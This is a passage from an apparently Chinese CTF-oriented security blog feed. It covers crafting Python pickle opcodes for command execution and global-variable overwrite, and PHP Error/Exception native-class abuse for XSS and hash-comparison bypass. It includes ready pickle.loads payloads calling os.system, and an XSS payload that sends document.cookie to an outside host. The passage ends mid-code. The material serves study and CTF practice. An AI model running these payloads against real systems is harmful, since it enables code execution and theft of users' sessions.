<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">instance = OBJ(GLOBAL(&#x27;__main__&#x27;, &#x27;Koishi&#x27;), &#x27;1&#x27;,&#x27;2&#x27;)</span><br><span class="line">return instance</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">instance = INST(&#x27;__main__&#x27;, &#x27;Koishi&#x27;)</span><br><span class="line">instance.name=&#x27;1&#x27;</span><br><span class="line">instance.category=&#x27;2&#x27;</span><br><span class="line">return instance</span><br></pre></td></tr></table></figure></div>



<h5 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h5><ul>
<li>通过<code>b&#39;R&#39;</code>调用：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">s=&#x27;whoami&#x27;</span><br><span class="line">system = GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)</span><br><span class="line">system(s) # `b&#x27;R&#x27;`调用</span><br><span class="line">return</span><br></pre></td></tr></table></figure></div>

<ul>
<li>通过<code>b&#39;i&#39;</code>调用：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">INST(&#x27;os&#x27;, &#x27;system&#x27;, &#x27;whoami&#x27;)</span><br><span class="line">return</span><br></pre></td></tr></table></figure></div>

<ul>
<li>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">OBJ(GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;), &#x27;whoami&#x27;)</span><br><span class="line">return</span><br></pre></td></tr></table></figure></div>

<ul>
<li>多参数调用函数</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">INST(&#x27;[module]&#x27;, &#x27;[callable]&#x27;[, par0,par1...])</span><br><span class="line">OBJ(GLOBAL(&#x27;[module]&#x27;, &#x27;[callable]&#x27;)[, par0,par1...])</span><br></pre></td></tr></table></figure></div>

<p>例子</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#pker: 命令执行</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通过`b&#x27;c&#x27;`与`b&#x27;o&#x27;`调用：</span></span><br><span class="line">    <span class="comment"># OBJ(GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;), &#x27;whoami&#x27;)</span></span><br><span class="line">    <span class="comment"># return</span></span><br><span class="line">    pickle.loads(<span class="string">b&quot;(cos\nsystem\nS&#x27;whoami&#x27;\no.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通过`b&#x27;i&#x27;`调用：</span></span><br><span class="line">    <span class="comment"># INST(&#x27;os&#x27;, &#x27;system&#x27;, &#x27;whoami&#x27;)</span></span><br><span class="line">    <span class="comment"># return</span></span><br><span class="line">    pickle.loads(<span class="string">b&quot;(S&#x27;whoami&#x27;\nios\nsystem\n.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通过`b&#x27;R&#x27;`调用：</span></span><br><span class="line">    <span class="comment"># s=&#x27;whoami&#x27;</span></span><br><span class="line">    <span class="comment"># system = GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)</span></span><br><span class="line">    <span class="comment"># system(s)</span></span><br><span class="line">    <span class="comment"># return</span></span><br><span class="line">    pickle.loads(<span class="string">b&quot;S&#x27;whoami&#x27;\np0\n0cos\nsystem\np1\n0g1\n(g0\ntR.&quot;</span>)</span><br></pre></td></tr></table></figure></div>



<h5 id="3-pker：全局变量覆盖"><a href="#3-pker：全局变量覆盖" class="headerlink" title="3.pker：全局变量覆盖"></a>3.pker：全局变量覆盖</h5><p>比如我们创建一个main文件外的hardworking的模块，模块内写下(其实感觉我写的例子不太合适，但是知道什么意思就行了)</p>
<p><strong>hardworking.py</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">run</span>():</span><br><span class="line">    a = <span class="string">&quot;you&quot;</span></span><br><span class="line">    b = <span class="string">&quot;are&quot;</span></span><br><span class="line">    c = <span class="string">&quot;stupid&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.a+<span class="string">&quot; &quot;</span>+self.b+<span class="string">&quot; &quot;</span>+self.c)</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">#pker: 全局变量覆盖</span><br><span class="line">    y= pickle.loads(b&quot;chardworking\nrun\np0\n0g0\n(&#125;(S&#x27;a&#x27;\nS&#x27;I&#x27;\ndtbg0\n(&#125;(S&#x27;b&#x27;\nS&#x27;am&#x27;\ndtbg0\n(&#125;(S&#x27;c&#x27;\nS&#x27;smart&#x27;\ndtbg0\n.&quot;)</span><br><span class="line">    print(y.a + &quot; &quot; + y.b + &quot; &quot; + y.c)</span><br></pre></td></tr></table></figure></div>



<h5 id="手动辅助"><a href="#手动辅助" class="headerlink" title="手动辅助"></a>手动辅助</h5><ul>
<li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li>
<li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li>
</ul>
<h1 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h1><p>[SUCTF2019 Guess Game](R:\Competition questions\SUCTF 2019\guess_game\guess_game.md)</p>
<p>[CISCN2019 ikun](R:\Competition questions\CISCN2019\web2 ikun)</p>
<p>[unpickle（不好）](R:\Competition questions\其他练习题\vulhub-python-unpickle.md)</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>php原生类利用</title>
    <url>/2022/01/08/blog_php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>可以使用如下指令列出所有内置类</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(get_declared_classes());</span><br></pre></td></tr></table></figure></div>



<h2 id="使用-Error-Exception-内置类进行-XSS"><a href="#使用-Error-Exception-内置类进行-XSS" class="headerlink" title="使用 Error&#x2F;Exception 内置类进行 XSS"></a>使用 Error&#x2F;Exception 内置类进行 XSS</h2><h3 id="Error-内置类"><a href="#Error-内置类" class="headerlink" title="Error 内置类"></a>Error 内置类</h3><ul>
<li>适用于php7版本</li>
<li>在开启报错的情况下</li>
</ul>
<p>Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 <code>echo &lt;Object&gt;</code> 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发<code>__toString</code> 方法，这是一种挖洞的新思路。</p>
<p>下面演示如何使用 Error 内置类来构造 XSS。</p>
<p>测试代码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）</p>
<p>给出POC：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01601944d88eb5e1fe.png"
                      alt="img"
                ></p>
<p>成功弹窗。</p>
<h3 id="Exception-内置类"><a href="#Exception-内置类" class="headerlink" title="Exception 内置类"></a>Exception 内置类</h3><ul>
<li>适用于php5、7版本</li>
<li>开启报错的情况下</li>
</ul>
<p>测试代码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>给出POC：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01f855418a04c115ae.png"
                      alt="img"
                ></p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><strong>[BJDCTF 2nd]xss之光</strong></p>
<p>进入题目，首先通过git泄露拿到源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure></div>

<p>仅看到一个反序列化函数并没有给出需要反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化。又发现有个echo，没得跑了，就是我们刚才演示的利用Error或Exception内置类进行XSS，但是查看一下题目的环境发现是PHP 5，所以我们要使用Exception类。</p>
<p>由于此题是xss，所以只要xss执行window.open()就能把flag带出来，所以POC如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.open(&#x27;http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?&#x27;+document.cookie);&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>得到payload如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">/?yds_is_so_beautiful=O%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">Exception</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A109%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ewindow.open%<span class="number">28</span>%<span class="number">27</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fde28dfb3-f224-<span class="number">48</span>d4-b579-f1ea61189930.node3.buuoj.cn%<span class="number">2</span>F%<span class="number">3</span>F%<span class="number">27</span>%<span class="number">2</span>Bdocument.cookie%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">2</span>Fusercode%<span class="number">2</span>Ffile.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A2%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></div>

<p>执行后，得到flag就在 cookie 中：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t013a06ad75649e2590.png"
                      alt="img"
                ></p>
<h2 id="使用-Error-Exception-内置类绕过哈希比较"><a href="#使用-Error-Exception-内置类绕过哈希比较" class="headerlink" title="使用 Error&#x2F;Exception 内置类绕过哈希比较"></a>使用 Error&#x2F;Exception 内置类绕过哈希比较</h2><p>在上文中，我们已经认识了Error和Exception这两个PHP内置类，但对他们妙用不仅限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。这里我们就要详细的说一下这个两个错误类了。</p>
<h3 id="Error-类"><a href="#Error-类" class="headerlink" title="Error 类"></a>Error 类</h3><p><strong>Error</strong> 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。</p>
<p><strong>类摘要：</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Error</span> <span class="keyword">implements</span> <span class="built_in">Throwable</span> &#123;</span><br><span class="line">    <span class="comment">/* 属性 */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>类属性：</strong></p>
<ul>
<li>message：错误消息内容</li>
<li>code：错误代码</li>
<li>file：抛出错误的文件名</li>
<li>line：抛出错误在该文件中的行数</li>
</ul>
<p><strong>类方法：</strong></p>
<ul>
<li><a href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</li>
<li><a href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</li>
<li><a href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</li>
<li><a href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</li>
<li><a href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</li>
<li><a href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</li>
<li><a href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</li>
<li><a href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</li>
<li><a href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</li>
<li><a href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</li>
</ul>
<h3 id="Exception-类"><a href="#Exception-类" class="headerlink" title="Exception 类"></a>Exception 类</h3><p><strong>Exception</strong> 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。</p>
<p><strong>类摘要：</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Exception</span> &#123;</span><br><span class="line">    <span class="comment">/* 属性 */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>类属性：</strong></p>
<ul>
<li>message：异常消息内容</li>
<li>code：异常代码</li>
<li>file：抛出异常的文件名</li>
<li>line：抛出异常在该文件中的行号</li>
</ul>
<p><strong>类方法：</strong></p>
<ul>
<li><a href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</li>
<li><a href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</li>
<li><a href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</li>
<li><a href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</li>
<li><a href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</li>
<li><a href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</li>
<li><a href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</li>
<li><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</li>
<li><a href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</li>
<li><a href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</li>
</ul>
<p>我们可以看到，在Error和Exception这两个PHP原生类中内只有 <code>__toString</code> 方法，这个方法用于将异常或错误对象转换为字符串。</p>
<p>我们以Error为例，我们看看当触发他的 <code>__toString</code> 方法时会发生什么：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure></div>

<p>输出如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 <code>Error(&quot;payload&quot;,1)</code> 中的错误代码“1”则没有输出出来。</p>
<p>在来看看下一个例子：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure></div>

<p>输出如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>可见，<code>$a</code> 和 <code>$b</code> 这两个错误对象本身是不同的，但是 <code>__toString</code> 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 <code>__toString</code> 返回的数据包含当前行号。</p>
<p>Exception 类与 Error 的使用和结果完全一样，只不过 <code>Exception</code> 类适用于PHP 5和7，而 <code>Error</code> 只适用于 PHP 7。</p>
<p>Error和Exception类的这一点在绕过在PHP类中的哈希比较时很有用，具体请看下面这道例题。</p>
<h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><p><strong>[2020 极客大挑战]Greatphp</strong></p>
<p>进入题目，给出源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span 